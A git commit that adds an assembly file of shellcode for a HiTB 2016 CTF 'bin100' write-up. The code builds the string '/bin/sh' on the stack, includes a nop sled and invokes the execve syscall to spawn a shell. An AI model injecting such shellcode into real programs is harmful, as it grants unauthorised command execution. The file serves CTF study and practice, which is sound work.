f45e56db2ee2f7382429db5fd1fb88139f900359
Ingmar Steen <iksteen@gmail.com>
2016-05-29 12:37:04 +0200

    Add HiTB 2016 bin100 - Stone Soup writeup.
    Former-commit-id: fde2fae88c66d1bca4326f5bfb421e9beddfb2ac
    Former-commit-id: 13beb94a2fd80facd54f0eee564d4518c8a82f4a
    Former-commit-id: f94b54b8e4383b49609cef4078ebe44d54166fff
    Former-commit-id: 96addc425e3ddf4b5ff99c6d82398f4e655ee61b
    Former-commit-id: 5cb0636d59abd48cbd14518ba9e0fdb3d082e56e
    Former-commit-id: e1454fcc66c5e3f9ad23e5ee63d4e425aa2fb41f
    Former-commit-id: 8865ef040c694065ebdb6b973dedf15673efbeb6
    Former-commit-id: 03b9ed325c90bc0bfb4d266af02fe75d758a9ed3
    Former-commit-id: 11872088a60b061a3c9d5fe51898fb69b828bfbf
    Former-commit-id: bbf5636c77b01fcecbe09a2aac85c5d1dbfb0ea4
    Former-commit-id: 4b133e7acaae84cb0ce517658ad798a320ad5933
    Former-commit-id: a02f09af25fb50d59be3538f13b693b8993e906c
    Former-commit-id: ea8856bdd2b09a7d54bac8b0e73864e3df7b2dbc
    Former-commit-id: 63085b2175bde86e3882cfaeafe0d76cedffa72e
    Former-commit-id: 472c0e09a2fd8bb47400bf46f7b07bfd93f3b36d
    Former-commit-id: c18106c393dd7b49ce84ad61dd197be2650af84e

---
+++ content/downloads/hitb-2016-ctf/bin100/shellcode_input.asm
@@ -0,0 +1,68 @@
+sub rsp, 8
+mov qword ptr [rsp], 1852400175
+mov qword ptr [rsp + 4], 6845231
+push 0
+push 0
+push rsp
+add dword ptr [rsp], 16
+push rsp
+push rsp
+add dword ptr [rsp], 32
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+mov rsi, qword ptr [rsp + 8]
+mov rdi, qword ptr [rsp]
+mov rax, 59
+xor rdx, rdx
+syscall
